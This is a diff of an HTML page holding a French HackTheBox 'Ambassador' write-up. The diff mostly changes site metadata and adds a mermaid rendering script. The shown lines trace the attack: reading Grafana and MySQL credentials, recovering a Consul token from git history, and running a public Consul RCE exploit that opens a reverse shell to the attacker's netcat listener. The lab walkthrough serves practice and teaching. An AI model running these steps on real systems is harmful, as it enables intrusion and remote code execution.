@@ -7,7 +7,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:conflict]">
 <meta name="description" content="Medium / Linux" />
-<meta name="keywords" content="cybersecurity blog french hacking rami malek, linux, CVE, grafana, mysql, linpeas, consul" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek pwn reverse reversing binary exploitation, linux, CVE, grafana, mysql, linpeas, consul" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="/htb/ambassador/" />
@@ -44,11 +44,11 @@
   <meta itemprop="datePublished" content="2023-01-04T00:00:00+00:00">
   <meta itemprop="dateModified" content="2023-01-04T00:00:00+00:00">
   <meta itemprop="wordCount" content="770">
-  <meta itemprop="image" content="/">
+  <meta itemprop="image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
   <meta itemprop="keywords" content="Linux,Cve,Grafana,Mysql,Linpeas,Consul">
 
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="/">
+  <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
   <meta name="twitter:title" content="📙 HackTheBox - Ambassador">
   <meta name="twitter:description" content="Medium / Linux">
 
@@ -69,7 +69,7 @@
     <meta property="article:tag" content="Mysql">
     <meta property="article:tag" content="Linpeas">
     <meta property="article:tag" content="Consul">
-    <meta property="og:image" content="/">
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
       <meta property="og:see_also" content="/htb/broscience/">
       <meta property="og:see_also" content="/htb/photobomb/">
       <meta property="og:see_also" content="/htb/updown/">
@@ -107,7 +107,7 @@
         
             <span class="logo__mark">-</span>
             <span class="logo__text ">
-                cnf409</span>
+                conflict</span>
             <span class="logo__cursor" style=
                   "
                    background-color:#527ea9;
@@ -174,10 +174,12 @@
 <h1 id="note">Note</h1>
 <p>La room était assez sympa, plutôt entre medium et easy. C&rsquo;est dommage qu&rsquo;il n&rsquo;y ait &ldquo;que&rdquo; des CVE même si l&rsquo;exploitation de Consul est intéressante.</p>
 <h1 id="recon">Recon</h1>
-<pre tabindex="0"><code>dirb http://10.10.11.183
-</code></pre><p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
-<pre tabindex="0"><code>nmap -sC -sV 10.10.11.183
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">3000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ppp</span><span style="color:#f92672">?</span>
+<pre class="mermaid">dirb http://10.10.11.183
+</pre>
+<p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
+<pre class="mermaid">nmap -sC -sV 10.10.11.183
+</pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">3000</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span> <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">ppp</span><span style="color:#f92672">?</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">fingerprint</span><span style="color:#f92672">-</span><span style="color:#a6e22e">strings</span><span style="color:#f92672">:</span> 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#a6e22e">FourOhFourRequest</span><span style="color:#f92672">:</span> 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>     <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
@@ -217,8 +219,9 @@
 <p>On trouve assez rapidement un mot de passe dans la table <code>data_source</code></p>
 <p><img src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png" alt="password.png"></p>
 <p>On se connecte à la database mysql avec comme user “grafana” et le mot de passe qu&rsquo;on vient de trouver</p>
-<pre tabindex="0"><code>mysql -u grafana -p -h ambassador.htb
-</code></pre><p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
+<pre class="mermaid">mysql -u grafana -p -h ambassador.htb
+</pre>
+<p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
 <p><img src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png" alt="2022-12-05-150214_964x1048_scrot.png"></p>
 <p>On peut donc switcher dessus et lister les tables qu&rsquo;elle contient via la commande <code>show TABLES;</code></p>
 <p>Il n’y en a qu’une seule: <code>users</code>. En lisant son contenu, on voit un mot de passe encodé en <code>base64</code></p>
@@ -250,15 +253,17 @@
 </span></span><span style="display:flex;"><span>drwxrwxr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">8</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2022</span> <span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>my<span style="color:#f92672">-</span>app<span style="color:#f92672">/.</span>git
 </span></span></code></pre></div><p>On voit qu&rsquo;il existe un répertoire <code>.git</code> dans <code>/opt/my-app</code></p>
 <p>On peut donc s&rsquo;y rendre puis faire un <code>git log</code> pour accéder à l&rsquo;historique des commits faits au repo. On affiche ensuite les changements faits au commit original</p>
-<pre tabindex="0"><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
-</code></pre><p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
+<pre class="mermaid">git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+</pre>
+<p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
 <p><img src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png" alt="bb03b43b-1d81-d62b-24b5-39540ee469b5"></p>
 <p>On reprend donc <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">l&rsquo;exploit</a> de tout à l&rsquo;heure, que devrait fonctionner maintenant qu&rsquo;on a le <code>token consul</code></p>
 <blockquote>
 <p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p></blockquote>
 <p>On lance notre listener <code>netcat</code>, puis on lance l&rsquo;exploit sur la machine via cette commande</p>
-<pre tabindex="0"><code>python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
-</code></pre><blockquote>
+<pre class="mermaid">python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
+</pre>
+<blockquote>
 <p>8500 = Port sur lequel se trouve le service <code>consul</code></p>
 <p>1338 = Port sur lequel écoute notre <code>netcat</code></p>
 <p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p></blockquote>
@@ -296,7 +301,7 @@
     
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2024</span>
+            <span>&copy; 2025</span>
             <span><a href="/">conflict</a></span>
             <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
             
@@ -324,6 +329,30 @@
 
 
 
+
+<script type="module">
+    import mermaid from "https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs";
+    const settings = localStorage.getItem("theme") === "dark" ?
+        {
+            startOnLoad: true,
+            theme: "dark",
+            darkMode: true,
+            themeVariables: {
+                tertiaryColor: "#dee3ed"
+            }
+        }
+        :
+        {
+            startOnLoad: true,
+            theme: "base",
+            darkMode: false,
+            themeVariables: {
+                tertiaryColor: "#dee3ed"
+            }
+        }
+    ;
+    mermaid.initialize(settings);
+</script>
 
     </body>
 </html>
